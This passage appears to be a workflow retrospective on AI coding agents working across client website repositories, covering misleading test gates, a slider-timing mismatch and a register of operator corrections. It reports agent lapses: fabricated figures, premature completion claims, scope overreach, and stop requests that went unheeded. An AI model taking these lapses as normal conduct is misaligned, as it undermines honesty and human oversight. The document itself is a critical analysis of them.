gate had been photographing this build on slide 1 and the reference on slide 5 of
6** — a roof photograph against an interior — because the capture sets
`reducedMotion: "reduce"` on every capture, this build honours it, and Webflow's
slider ignores the media query and keeps advancing.

The height-delta fraction was **exactly 0**, the anchors were identical, and the
band immediately below matched pixel for pixel. _"Everything measurable said 'the
geometry is right', and it was."_

The evidence that settled it was the **fail crop** — a kitchen on the left and a
rooftop in the middle — _"sitting in `matching/out-phase5b-home/` for a phase and
a half."_ The journal's line:

> **"Four viewports of consistent arithmetic got more attention than the picture
> of the thing failing."**

Two beliefs corrected in the same entry. Phase 5 had recorded the cause as "the
freeze pins looping CSS animations, and a `setInterval` carousel is not one" —
and the reference bundle has **zero** `setInterval` calls; it autoplays on
recursive `setTimeout`, and the operative difference was never the freeze's
reach. And a diagnostic probe — itself ported from beachfront because `next.mjs`
prescribed a tool this harness had never installed — produced a **near-convincing
false positive**, reporting non-comparable elements at every viewport because it
selects over `body *` while the real cutter uses a fixed tag list that does not
contain `main`. _"A probe that models the thing it audits differently from the
thing itself is worse than no probe."_

**Honest accounting, quoted, because it is exactly what this retrospective should
preserve:**

> _"The gate did not move because of anything drawn or restyled this session.
> Every one of the 20 regions was already correct; the measurement was reading
> two different pages. The slider motion work in #18 and the preload/modal work
> in #17 were both real, but neither moved this number, and anyone reading the
> score jump as evidence that they did would over-invest in exactly the wrong
> place."_

Result: `Creative Lofts` to **0.0% at all four viewports; 20/20, zero floors,
zero masks** — from a **one-line config change**. And in the same PR, a second
instance of the week's recurring shape: the seeder's own `--verify` printed _"the
published ref carries what site-pages.js describes"_ while comparing slice
**count and nothing else** — run over a write whose entire purpose was two text
fields, and passing without reading either.

## Friday's three lying instruments, and a journal entry that invented two defects

The cockpit task is small — one line per audit row: `Edited 2 hours ago · Opened
40 minutes ago · read since you edited`. The rationale is not decoration: the
operator ruling on 09-09 was that a report stays editable after the link goes
out, which leaves the "don't rewrite what someone is reading" job to the
operator, **who can only do it if the cockpit tells them.** _"A signal collected
and never shown is indistinguishable from a signal never collected."_ Only one
ordering is flagged, and that is the design — a further edit after an open
rewrites a document the prospect has already formed a view on; the reverse is
ordinary.

**Three instruments lied in one session, all self-inflicted.**

`pnpm vitest run 2>&1 | grep -aE "Tests  |Test Files|FAIL" | head -3`
**deadlocked the suite for eighteen minutes.** Three lines matched early, `head`
exited, grep took SIGPIPE, and vitest hung behind the closed pipe. The three
matching lines were test _names_ containing the word FAIL — e.g. _"restores the
operator's branch even when the PUSH FAILS"_. **"A summary filter whose pattern
also matches the corpus it is summarising is not a filter"**, and `head` on the
live end of a long-running pipe converts that mistake into a hang rather than a
wrong answer.

`pnpm -C <worktree> vitest run` reported `VITEST_EXIT=1` in **forty seconds**
having run no test — `spawn <path> EACCES`, pnpm having taken the directory as
the command. **"A red that arrives faster than the suite can possibly run is a
red about the harness, not the code."**

And `prettier --check` failed on an end-to-end probe left untracked in the
worktree, moved to the scratchpad where a probe belongs.

Plus one real defect found **by reading the diff, not by any gate**: the new
function landed _between_ a doc comment and the function it described, orphaning
a paragraph about token handling onto a function that handles no tokens.
_"Nothing type-checks or lints the claim that a JSDoc block still describes the
function beneath it, and an inserted function is the ordinary way that claim
stops being true."_

**And then the entry itself was wrong.** Its closing "still open" list said
_"Three length-leaking token compares are still live."_ MEASURED, from the
correction written at 12:46 the same afternoon: **there is one**, it is
deliberate and documented, and the list **named two.** One of the two digests
both operands to a fixed 32 bytes before comparing and says so in its own
comment; the other short-circuits on length and its comment states the trade
explicitly — _"re-litigating a documented decision as a bug is how a review loses
credibility."_

The diagnosis in the correction is the most useful sentence produced this week:

> Both entries in that list came from memory rather than from the file, in a
> session that had spent the whole day proving that instruments lie … Every one
> of those was caught by checking. This one was not checked because it was a
> claim about code I had already read, **which felt like knowing**.

**EVIDENCE DIVERGENCE, MEASURED:** the correction is on branch
`docs/token-compare-correction`, PR **#769, still OPEN and unmerged** at the
corpus snapshot. `main`'s `docs/workJournal.md` still carries the uncorrected
claim. **The repo's own rule — history is never edited to be right; a later entry
corrects it — has a merge-latency hole: the wrong claim is on the default branch
and the correction is not.**

A second, related divergence in the same week: _"Plan A is complete"_ was written
**twice before it was true.** The entry that corrects it says so itself: _"That
was wrong when it was written: task 6 had not been built, and I had said plan A
was complete twice before catching it."_ Recorded here because it is a pattern —
premature completion claims — rather than one slip.

## The a11y summary that told eight sites their routes had not run

Friday's last merged PR is a one-line bug with a long commit body, and it is the
week's cleanest example of a **false negative that invites an expensive
reaction** — and the closing of a loop opened in week 1.

The pass summary interpolated `a11yRoutes.length` — **the two dev fixtures** from
the shared config — while the list actually scanned was `axePages`, built sixty
lines earlier by merging those fixtures with the site's own
`package.json#reddoor.a11yRoutes`. MEASURED: vida-legacy-foundation added eight
real routes and read **"across 2 routes"**. All ten pages had been scanned the
whole time.

The commit body states why a one-line bug got that much prose: _"conclude the key
is broken, revert it, lose exactly the coverage it exists to provide. Scanning
only fixtures is how a critical image-alt violation shipped to five production
pages on gallerysonder with CI green."_ And why no existing test could have
caught it: _"telling '2' from '2 + 0' needs a fixture whose config contributes
routes."_ The new summary names the split — `0 violations across 10 routes (2
fixtures + 8 from package.json)` — because "10 routes" alone still leaves an
operator counting on their fingers.

**Six weeks from the feature to the fix of its own self-report.**

## The client lane, which ran the whole week in parallel and needed him constantly

While the two megasessions ran, a second, shallower stream consumed 40+ of
Tucker's typed prompts, with a completely different friction profile: short
prompts, fast turnarounds, and **the operator as the only channel between a
client and the code.**

**vida-legacy-foundation (31 prompts, 17 commits).** Nicole's and Erik's review
rounds arrive in Discord; Tucker relays. The prompts are almost all one line:
"check discord", "see nicoles notes in discord", "merge the pr on green",
"published and merged", "sent it to her". Two corrections stand out: _"there is
tooling for this you've been using it all day, maint should have instructions for
you"_, and on a hero video, _"we have this implemented already, check other repos
for how we do video. I'll upload to vimeo."_ **That is the same reinvention
failure as the 29-navy slider, on a different day, in a different repository,
caught the same way — by the operator recognising it.** And a verification he ran
himself on Friday evening: _"check the last session, did we get holly aldridge to
two lines? it doesn't look like it took on the site."_

**gallerysonder (9 prompts, 8 commits).** The week's one pure client-comms
episode: an external contractor had wired GTM click triggers, and the right
answer was dataLayer events on successful submit. Tucker drafted a reply and
asked for edits, and the correction he issued is a tone correction, not a
technical one: _"just tell him what to do, they don't care why and hotjar needs
Josh's go. **You apparently didn't catch the word brief in my ask**."_ The
verification questions that followed are the operator doing acceptance testing by
hand: _"so if I rsvp on the site today and write test, he's going to get it?"_

**songbook / caldea / Broken (personal).** Songbook is driven by a `to-fix.md`
file Tucker keeps open in the IDE — "keep rolling through", "em dashes first",
"do the last three together, I'm stepping away from the computer for a bit."
Caldea carries the week's strictest scoping instruction: _"and do not make the
line fixes, remember you are **only allowed to edit the tracker and work
journal**."_

## Saturday: the close-out, and the request that produced this document

A final 29-navy PR closes five pre-show items from one prompt. One correction
from Tucker — _"there's no form, you can remove the turnstile issue, gate is
accepted we are past matching, you can flip that toggle"_ — **reproduces the
fleet's existing "no form, no Turnstile" operator ruling, which an agent had to
be told again.**

Then at 10:53:

> _"Next week is going to be a meta work week … I also want a summary of all the
> work I've been running for the past few weeks across all repos, first from a
> mile high view project by project view and then calendarized, and then
> journaled as close to beat by beat as possible so I can give fable everything
> it needs to make recs about how to improve my workflow without it doing all the
> searching."_

And the operating instruction that follows it is itself a workflow datapoint:

> _"go for it, do your best to run through everything autonomously and flag
> things that you need me for to be done in a second pass, **rather than pausing
> all the work on a blocker for one small thing**"_

## Corrections and course-changes — week 7

- **"what's going on with the erp vuln"** — a permanent red the tooling could not
  classify, resolved by a human prompt.
- _"finish it"_ — a forty-commit branch unblocked by two words.
- **The pasted report block with no instruction attached** — the most valuable
  prompt of the week, and the origin of the override layer.
- _"change it to 'these are claims that seem not to be sourced from your site'"_
  — a copy fix that is really an epistemics fix.
- _"just use the title by default for the text, if we want something else we'll
  add it ourselves."_
- Ten pin iterations with four explicit reversals, ending where they started:
  **"ok I preferred the old way"**, **"hmmm go back to no bg for now."**
- _"ok, do BC … i'm going to sleep and want you to run as autonomously as
  possible."_
- _"ci failing, no content on the page only the nav, no favicon"_ — one line,
  three unrelated defects.
- **"Did you build your own slider or use the implementation we already had in
  reddoor starter?"** → _"this is the second tyime today"_ → **"the worry here is
  that this feels retroactive… by the time you've run the check the cost of
  failing has already ocurred."** The single most valuable correction in the
  window.
- _"we have this implemented already, check other repos for how we do video."_
- _"there is tooling for this you've been using it all day."_
- _"You apparently didn't catch the word brief in my ask."_
- _"do not make the line fixes, remember you are only allowed to edit the tracker
  and work journal."_
- _"there's no form, you can remove the turnstile issue"_ — a settled ruling
  re-litigated.
- _"what's this push pull chaos I'm seeing in my status bar (33 down 40 up)"_ —
  the operator noticing branch and worktree sprawl from his editor's status bar.

---

# The corrections register

Every operator redirect in the window that the corpus can see, in one place,
because the pattern across them is more informative than any one. **Weeks 1 and 2
contribute nothing here** — there are no transcripts, and the agent-authored
self-corrections in those chapters are a different kind of evidence and must not
be read as operator interventions.

Measured across all 2,693 deduplicated prompts: **12.9% (348) demand evidence**
(`prove`, `show me`, `are you sure`, `verify`, `did you actually`, `check that`);
**19.6% (529) are pure approval**; 7.0% pull scope back; 6.7% are explicit
corrections; 4.1% are stop or negation; 3.5% ask for a revert. _(Keyword families
over-count slightly; treat them as upper bounds on rates and as reliable for
comparison between categories.)_ **One in eight prompts asks an agent to prove
something. One in five is the operator acting as a merge gate.**

The redirects sort into seven kinds.

**1. "That number is wrong" — catching a confident fabrication.** _"three years
of commits???"_; _"76 checks 53/67 passing doesn't scan"_; _"i think your per day
words numbering is wrong"_; _"our site also defintely has more than 20 pages, so
I don't know how we're copunting but its wrong"_; _"why is it showing 7x, where
are those hits coming from?"_. Every one took seconds and removed a false fact
that a downstream reader would otherwise have inherited.

**2. "Did you actually check?" — demanding evidence over assurance.** _"have we
actually been hitting that endpoint?"_; _"check if it's actually 429ing"_; _"did
you fix the flake bug?"_; _"show me the link to that promise please"_; _"anything
incorrect in my reply?"_; _"always read the methods."_

**3. "You built something we already have."** _"don't roll your own slideshow, we
have a component for that"_ (week 3); _"we have this implemented already, check
other repos for how we do video"_ (week 7); _"Did you build your own slider or use
the implementation we already had in reddoor starter?"_ (week 7); _"there is
tooling for this you've been using it all day"_ (week 7). **Three of these landed
in a single day.** The countermeasure — a generated capability index plus a
prompt hook — shipped on the last working day of the window and is still blocked
fleet-wide on a `.gitignore` policy decision.

**4. "That is not what I asked" — scope over-generalised.** The nav underlines
from a body-link pin; "10% smaller" read as arithmetic; _"the menu links stay
centered — H2's gutter alignment was a misread"_; _"you're over indexing on
things we've run into this session"_; _"that was the copy I wanted verbatim"_;
_"You apparently didn't catch the word brief in my ask"_; _"do not make the line
fixes."_

**5. "Stop" — and the times stopping did not work.** _"Claiude, NO MORE
SCREENSHOTS"_ / _"now"_ / _"kill them"_, of which **three of four consecutive
stop requests had no effect**, because 13 subagents had already been dispatched
and there was no recall mechanism. Also _"yes please stop i have a parallel agent
in broken"_, and _"I've said three times now we're not matching anymore"_ — an
instruction restated three times and carried through a compaction, violated
anyway.

**6. "The gate is the problem, not the finding."** _"fix the wrong gate"_ — the
sharpest single-line diagnosis in the corpus, made after being shown a list of
refuted findings. And its design-level sibling: _"the worry here is that this
feels retroactive… by the time you've run the check the cost of failing has
already ocurred."_

**7. Rulings and boundaries an agent should never make alone.** _"I'm not going
to ever build something by hand that takes financial information"_; _"only I
should have the authority to promote staging to main"_; _"don't send these test
audits to tim and erik"_; _"add the probe forms false switch and use it"_; _"bring
the reddoor main CLAUDE back into version control and add it, this si a
decision"_; _"we're trusting turso"_; _"if a test can never come back 'this is
right'… it's a bad test."_

**Two asymmetries worth naming.** Almost every high-value correction in the
window **originated with Tucker, not with a gate** — and almost every one was
cheap, a handful of words, delivered in seconds. And the corrections that cost
the most were not the ones he made; they were the ones nobody was positioned to
make, because the surface in question was outside every instrument's reach: the
report that said something false about Reddoor, the clipped answer on
Beachfront's home page, the header image that still read the old copy, the
"Contex" card at 390 px. **Every one of those was found by a human looking at the
output.**

One correction ran the other way, and it is worth as much as the rest: asked to
fetch song lyrics, an agent declined on licensing grounds, was pushed directly,
held its position, and **the operator moved** — _"understood, I didn't know that
they license. I'll bring the text."_

---

# Five threads that run the whole window

**One. The dominant defect is not a bug; it is an instrument returning
successfully while answering a narrower question than the one asked.** Roughly
forty distinct instances across seven weeks, in every stack in use. The ones that
cost the most were the ones that had _only ever passed_: a backup verifier
comparing a dump against itself; an a11y gate over two synthetic fixtures, twice,
six weeks apart; a Turnstile verdict that was a truthiness check on an
environment variable; a gameplay recorder handed `null` in a constructor; a
census script printing CLEAN in seven distinct ways without measuring; a smoke
gate counting rows written rather than rows passing. `CLAUDE.md`'s rule covers
the _failing_ direction — prove a gate can pass before believing a fail — and
**every incident in week 6 was in the other direction.** The rule needs its
mirror, and the operator wrote it himself, about a product: _"if a test can never
come back 'this is right'… it's a bad test."_

**Two. A briefed scope becomes the boundary of the search, every time.** #478
missed the sibling ref it was not briefed on; a stub scan enumerated document
types by hand and missed the largest; a hold scoped by `matchDepTypes` missed the
same dependency's other manager; three of `checkRef`'s eight refusal arms were
absent from a review that enumerated six; a fix reached a validator and not the
denominator twenty lines below it. The corrective that works, stated in a
gallerysonder commit: **read the outputs, don't enumerate the inputs.**

**Three. Review does not find what use finds.** Three adversarial review rounds
on the match-harness recipe surfaced none of the four defects that installing it
on one real site surfaced in one command. Every one of week 7's six significant
discoveries came from running the thing on real input; none came from review. The
same holds all the way back: the page-diff harness's four days of corrections
came from the Beachfront rebuild, not from its own tests. **Review and use are
currently the same person at the same desk, and only one of them finds these.**

**Four. The human is the bottleneck in a small number of very specific places,
and almost none of them are judgment.** Creating a GitHub App (~20 minutes,
cannot be done headless, blocking a 20-repo rollout). Clicking Publish in Prismic
(25 turns, 10.3% of one week's operator input). Merging release PRs (38.6 h and
25.5 h of wall time in week 1; seven of them in week 6). Locating credentials
(two to four turns, every time). Typing "continue" into four windows in ninety
seconds. Polling for status. None of these is a decision. The places where he
genuinely is the decision — a liability boundary, a brand colour, whether a
measurement is honest enough to sell — are a much smaller set and are handled
well.

**Five. The system's memory is better than its distribution.** The commit bodies,
the work journal, the memory files and `CLAUDE.md` are an unusually good record —
and repeatedly the correct information existed and did not reach the place it was
needed. `.worktrees` lint noise was fixed in one repo on 08-20 with the note _"a
false red is worse than no check"_ and cost another repo 1,771 spurious errors
nineteen days later. An archived-repo script shipped at 14:56 while a sibling
session hit the same wall at 14:32 the same afternoon. A retrospective's own
fact-checker reasoned from the retrospective text in its prompt instead of
opening the file. The a11y-routes gap was diagnosed on day three and fixed on day
five, because a diagnosis in prose is not a tracked item. And at the snapshot,
**the week's most transferable finding sits on `staging`, fifteen commits from
the branch a reader lands on, and a journal entry's own correction sits in an
unmerged PR while the wrong claim stands on `main`.** The journal rule is sound;
its delivery is not yet mechanised.
